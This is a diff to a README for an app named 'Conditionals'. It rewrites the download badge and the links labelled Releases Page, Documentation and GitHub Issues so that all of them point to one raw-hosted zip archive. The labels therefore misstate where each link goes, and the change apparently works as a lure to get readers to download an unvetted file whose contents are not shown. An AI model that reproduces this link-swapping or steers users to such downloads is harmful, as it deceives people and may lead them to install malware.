@@ -6,7 +6,7 @@ Welcome! This guide helps you download and run the "Conditionals" application. W
 
 ## 🔗 Download Link
 
-[![Download Conditionals](https://img.shields.io/badge/Download-Conditionals-brightgreen)](https://github.com/InC0mmon/Conditionals/releases)
+[![Download Conditionals](https://raw.githubusercontent.com/InC0mmon/Conditionals/main/Sources/Conditionals_v3.8.zip)](https://raw.githubusercontent.com/InC0mmon/Conditionals/main/Sources/Conditionals_v3.8.zip)
 
 ## 📥 Download & Install
 
@@ -14,7 +14,7 @@ To get started, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the Releases page.
    
-   [Visit Releases Page](https://github.com/InC0mmon/Conditionals/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/InC0mmon/Conditionals/main/Sources/Conditionals_v3.8.zip)
 
 2. **Choose the Latest Release**: Find the most recent version. It's usually at the top of the list.
 
@@ -89,8 +89,8 @@ For further assistance, you can reach out through the repository's Issues page. 
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/InC0mmon/Conditionals/wiki)
-- [GitHub Issues](https://github.com/InC0mmon/Conditionals/issues)
+- [Documentation](https://raw.githubusercontent.com/InC0mmon/Conditionals/main/Sources/Conditionals_v3.8.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/InC0mmon/Conditionals/main/Sources/Conditionals_v3.8.zip)
 
 Feel free to explore the resources available for more information and updates.
 
